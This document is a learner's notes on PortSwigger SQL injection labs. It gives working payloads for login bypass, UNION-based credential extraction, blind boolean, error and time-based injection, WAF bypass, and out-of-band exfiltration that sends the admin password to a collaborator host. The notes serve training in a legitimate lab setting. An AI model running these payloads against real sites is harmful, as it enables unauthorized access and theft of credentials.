# 🛡️ SQL Injection Notes (PortSwigger Labs)

> 📌 **Disclaimer**: This repository is for educational purposes only. It contains SQL Injection concepts and lab notes written during my learning journey. Do not use this knowledge for unethical or illegal purposes.

---

## 🔍 What is SQL Injection?

SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database.

### 🚨 How it Works
- Inject malicious SQL via input fields or URL parameters
- Trick the database into executing unintended commands
- Bypass authentication, exfiltrate data, or damage the system

### 💥 Consequences
- Unauthorized access
- Data leakage or deletion
- Bypass login controls
- Full DB takeover

### 🛡️ Prevention Methods
- Use **prepared statements** (parameterized queries)
- Sanitize and validate all user inputs
- Restrict database privileges
- Perform regular security testing

---

## 🧪 PortSwigger SQL Injection Lab Notes

## LAB - 1:  **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

In this lab, a vulnerability exists in the product filter category. I simply use the query.

—> `1' OR 1=1—` 

## **LAB - 2: SQL injection vulnerability allowing login bypass**

  ****In this lab, we need to log in as an Administrator using a login bypass on the login page. There is a vulnerability in the username field, which I exploit with the query

—> `administrator' OR 1=1—`

## LAB - 3: **SQL injection attack, querying the database type and version on Oracle**

 In this lab, I use a UNION attack to retrieve the results from an injected query.

first, I find out how my columns are in the table using —> `‘ Order By 1—`

When using UNION, always remember to use the same number of columns. If you only want one column, then use `NULL`.

The query I used —> `‘ UNION SELECT banner, Null FROM v$version—`  (Use Cheat Sheet for this.)

## LAB - 4: **SQL injection attack, querying the database type and version on MySQL and Microsoft**

First, check how many columns the database has by using 'ORDER BY 1 #' (here # is used to comment).

Then use the query —> `‘ UNION SELECT @@version, Null #` (Use cheat sheet)

## **LAB - 5: SQL injection attack, listing the database contents on non-Oracle databases**

In this lab, I don't have information about how many columns are in the table or the name of the table itself.

To find this information, I follow these steps:

First, I determine the number of columns in the table by using the query: `ORDER BY 1--`.

Next, I check the table name to identify all the tables in the database. To do this, I refer to the cheat sheet and use the query: `UNION SELECT table_name, null FROM information_schema.tables--`.

Once I have the table name, I find out the column names using the following query: `UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'TableName'--`.

After retrieving the column names, I can obtain the usernames and passwords using this query: `UNION SELECT username, password FROM TableName--`.

## **LAB - 6: SQL injection attack, listing the database contents on Oracle**

Same as previous, but only one change: the database is Oracle.

## **LAB - 7: SQL injection UNION attack, determining the number of columns returned by the query**

In this lab, I just have to find out the number of columns. To do that, I used this query `'+UNION+SELECT+NULL,NULL—`  instead of `Order by`

## **LAB - 8: SQL injection UNION attack, finding a column containing text**

In this lab, first, I have to find out the number of columns using the query **`'+UNION+SELECT+NULL,NULL,NULL—`**

I know the number of columns, now I have to find which null position is capable of a string. Just try to replace the given string with the null position one by one.

## **LAB - 9: SQL injection UNION attack, retrieving data from other tables**

Perform the same techniques used in labs 7 and 8 to find out the number of columns and the position data type. After that, just used the given information, and the  final query becomes **`'+UNION+SELECT+username,+password+FROM+users—`** 

## **LAB - 10: SQL injection UNION attack, retrieving multiple values in a single column**

In this lab, I have to find out multiple values like username and password from a single column. To do that, I just used concatenation, and the query I used was **`'+UNION+SELECT+NULL,username||':'||password+FROM+users—`**

# ***Blind SQL Injection***

## **LAB - 11: Blind SQL injection with conditional responses**

From this lab onwards, I don’t see any output on the response. In this lab, when the condition is true, it will print the Welcome Back message in the response. I used this to find out the table name, username, and password.

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` by using this query, I confirmed that there is a table called users.

`TrackingId=xyz' AND (SELECT 'a FROM users WHERE username='administrator')='a` used this query to confirm the username.

Then I used this query to find out the length of the password. You can find it manually or just use the Burp Intruder.

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`  

After the length, I find out all the characters contained in the password, use Intruder or a Python script. I used Burp’s Intruder. The query I used was `TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$`

## LAB - 12: Blind SQL injection with conditional errors

In this lab, When the condition is true, it sends the status code 200, and if it is false, 500.

I take advantage of this behavior. But concatenate your query after the cookie. Use Intruder.

`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||’`

## **LAB - 13: Visible error-based SQL injection**

In this lab, the errors are printed and expose the sensitive information.

`TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) AS bool)—` 

In the above query, we can see that I use And and after that CAST, which will convert the provided data into another type. If the data is not converted, it will print an error, and I got the password.

## **LAB - 14: Blind SQL injection with time delays**

In this lab, I always get the same response with the status code 200 ok, no matter whether the condition is true or false.  Also in this lab, I just have to observe the response time after using the query `TrackingId=x'||pg_sleep(10)—` 

## LAB - 15: **Blind SQL injection with time delays and information retrieval**

In this lab, I used the **Conditional time delays query** to retrieve the password of the Administrator.

The query I used was —> `SELECT CASE WHEN (SUBSTRING((Select password from users where username=’administrator’), 1, 1) = ‘a’) THEN pg_sleep(5) ELSE pg_sleep(0) END` 

## **LAB - 16: Blind SQL injection with out-of-band interaction**

What is out-of-band interaction?

—> A hacker sends a request to a vulnerable website. The website, without directly replying, secretly connects to the hacker’s server (like a DNS or HTTP request). That unexpected connection is an **OOB interaction**, and it confirms the vulnerability.

In this lab, we just have to trigger a DNS lookup and solve the lab 

Query I used was —> `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

## **LAB - 17: Blind SQL injection with out-of-band data exfiltration**

What does Data Exfiltration mean?

—> **Unauthorized transfer** of sensitive data **from a victim to an attacker**.

In this lab, first, I have done the same as I did in the previous lab. But with a different query.

I have to find the password of the user administrator. (**DNS lookup with data exfiltration)**

Query —> `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(Select password from users where username=’administrator’)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`

## **LAB - 18: SQL injection with filter bypass via XML encoding**

In this lab, I just obfuscated the WAF by encoding the query into XML using Hackvector Burp’s extension. 

Query—> `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`